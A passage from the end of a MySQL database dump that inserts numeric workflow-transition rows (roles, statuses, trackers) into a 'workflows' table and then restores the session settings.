NULL,NULL),(270,1,4,2,3,0,0,'WorkflowTransition',NULL,NULL),(271,1,4,2,4,0,0,'WorkflowTransition',NULL,NULL),(274,1,0,4,3,0,0,'WorkflowTransition',NULL,NULL),(275,1,0,4,4,0,0,'WorkflowTransition',NULL,NULL),(276,1,1,4,3,0,0,'WorkflowTransition',NULL,NULL),(277,1,1,4,4,0,0,'WorkflowTransition',NULL,NULL),(278,1,5,4,3,0,0,'WorkflowTransition',NULL,NULL),(279,1,5,4,4,0,0,'WorkflowTransition',NULL,NULL),(280,1,6,4,3,0,0,'WorkflowTransition',NULL,NULL),(281,1,6,4,4,0,0,'WorkflowTransition',NULL,NULL),(282,1,2,4,3,0,0,'WorkflowTransition',NULL,NULL),(283,1,2,4,4,0,0,'WorkflowTransition',NULL,NULL),(284,1,7,4,3,0,0,'WorkflowTransition',NULL,NULL),(285,1,7,4,4,0,0,'WorkflowTransition',NULL,NULL),(286,1,0,8,3,0,0,'WorkflowTransition',NULL,NULL),(287,1,0,8,4,0,0,'WorkflowTransition',NULL,NULL),(288,1,1,8,3,0,0,'WorkflowTransition',NULL,NULL),(289,1,1,8,4,0,0,'WorkflowTransition',NULL,NULL),(290,1,5,8,3,0,0,'WorkflowTransition',NULL,NULL),(291,1,5,8,4,0,0,'WorkflowTransition',NULL,NULL),(292,1,6,8,3,0,0,'WorkflowTransition',NULL,NULL),(293,1,6,8,4,0,0,'WorkflowTransition',NULL,NULL),(294,1,2,8,3,0,0,'WorkflowTransition',NULL,NULL),(295,1,2,8,4,0,0,'WorkflowTransition',NULL,NULL),(296,1,4,8,3,0,0,'WorkflowTransition',NULL,NULL),(297,1,4,8,4,0,0,'WorkflowTransition',NULL,NULL),(298,1,7,8,3,0,0,'WorkflowTransition',NULL,NULL),(299,1,7,8,4,0,0,'WorkflowTransition',NULL,NULL),(304,2,0,9,3,0,0,'WorkflowTransition',NULL,NULL),(305,2,0,9,4,0,0,'WorkflowTransition',NULL,NULL),(306,4,0,9,3,0,0,'WorkflowTransition',NULL,NULL),(307,4,0,9,4,0,0,'WorkflowTransition',NULL,NULL),(312,2,1,9,3,0,0,'WorkflowTransition',NULL,NULL),(313,2,1,9,4,0,0,'WorkflowTransition',NULL,NULL),(314,4,1,9,3,0,0,'WorkflowTransition',NULL,NULL),(315,4,1,9,4,0,0,'WorkflowTransition',NULL,NULL),(320,2,5,9,3,0,0,'WorkflowTransition',NULL,NULL),(321,2,5,9,4,0,0,'WorkflowTransition',NULL,NULL),(322,4,5,9,3,0,0,'WorkflowTransition',NULL,NULL),(323,4,5,9,4,0,0,'WorkflowTransition',NULL,NULL),(328,2,6,9,3,0,0,'WorkflowTransition',NULL,NULL),(329,2,6,9,4,0,0,'WorkflowTransition',NULL,NULL),(330,4,6,9,3,0,0,'WorkflowTransition',NULL,NULL),(331,4,6,9,4,0,0,'WorkflowTransition',NULL,NULL),(336,2,2,9,3,0,0,'WorkflowTransition',NULL,NULL),(337,2,2,9,4,0,0,'WorkflowTransition',NULL,NULL),(338,4,2,9,3,0,0,'WorkflowTransition',NULL,NULL),(339,4,2,9,4,0,0,'WorkflowTransition',NULL,NULL),(340,2,8,9,3,0,0,'WorkflowTransition',NULL,NULL),(341,2,8,9,4,0,0,'WorkflowTransition',NULL,NULL),(342,4,8,9,3,0,0,'WorkflowTransition',NULL,NULL),(343,4,8,9,4,0,0,'WorkflowTransition',NULL,NULL),(348,2,4,9,3,0,0,'WorkflowTransition',NULL,NULL),(349,2,4,9,4,0,0,'WorkflowTransition',NULL,NULL),(350,4,4,9,3,0,0,'WorkflowTransition',NULL,NULL),(351,4,4,9,4,0,0,'WorkflowTransition',NULL,NULL),(356,2,7,9,3,0,0,'WorkflowTransition',NULL,NULL),(357,2,7,9,4,0,0,'WorkflowTransition',NULL,NULL),(358,4,7,9,3,0,0,'WorkflowTransition',NULL,NULL),(359,4,7,9,4,0,0,'WorkflowTransition',NULL,NULL),(364,2,9,2,3,0,0,'WorkflowTransition',NULL,NULL),(365,2,9,2,4,0,0,'WorkflowTransition',NULL,NULL),(366,4,9,2,3,0,0,'WorkflowTransition',NULL,NULL),(367,4,9,2,4,0,0,'WorkflowTransition',NULL,NULL),(368,4,2,1,3,0,0,'WorkflowTransition',NULL,NULL),(369,4,2,1,4,0,0,'WorkflowTransition',NULL,NULL),(370,4,2,8,3,0,0,'WorkflowTransition',NULL,NULL),(371,4,2,8,4,0,0,'WorkflowTransition',NULL,NULL),(372,4,2,4,3,0,0,'WorkflowTransition',NULL,NULL),(373,4,2,4,4,0,0,'WorkflowTransition',NULL,NULL),(374,4,2,7,3,0,0,'WorkflowTransition',NULL,NULL),(375,4,2,7,4,0,0,'WorkflowTransition',NULL,NULL),(376,2,2,1,3,0,0,'WorkflowTransition',NULL,NULL),(377,2,2,1,4,0,0,'WorkflowTransition',NULL,NULL),(382,2,9,1,3,0,0,'WorkflowTransition',NULL,NULL),(383,2,9,1,4,0,0,'WorkflowTransition',NULL,NULL),(384,2,9,5,3,0,0,'WorkflowTransition',NULL,NULL),(385,2,9,5,4,0,0,'WorkflowTransition',NULL,NULL),(386,2,9,6,3,0,0,'WorkflowTransition',NULL,NULL),(387,2,9,6,4,0,0,'WorkflowTransition',NULL,NULL),(392,2,9,7,3,0,0,'WorkflowTransition',NULL,NULL),(393,2,9,7,4,0,0,'WorkflowTransition',NULL,NULL),(394,3,2,1,3,0,0,'WorkflowTransition',NULL,NULL),(395,3,2,1,4,0,0,'WorkflowTransition',NULL,NULL),(396,3,0,1,4,0,0,'WorkflowTransition',NULL,NULL),(407,4,9,1,3,0,0,'WorkflowTransition',NULL,NULL),(408,4,9,1,4,0,0,'WorkflowTransition',NULL,NULL),(409,4,9,5,3,0,0,'WorkflowTransition',NULL,NULL),(410,4,9,5,4,0,0,'WorkflowTransition',NULL,NULL),(411,4,9,6,3,0,0,'WorkflowTransition',NULL,NULL),(412,4,9,6,4,0,0,'WorkflowTransition',NULL,NULL),(413,4,9,4,3,0,0,'WorkflowTransition',NULL,NULL),(414,4,9,4,4,0,0,'WorkflowTransition',NULL,NULL);
/*!40000 ALTER TABLE `workflows` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2021-05-13 18:13:38
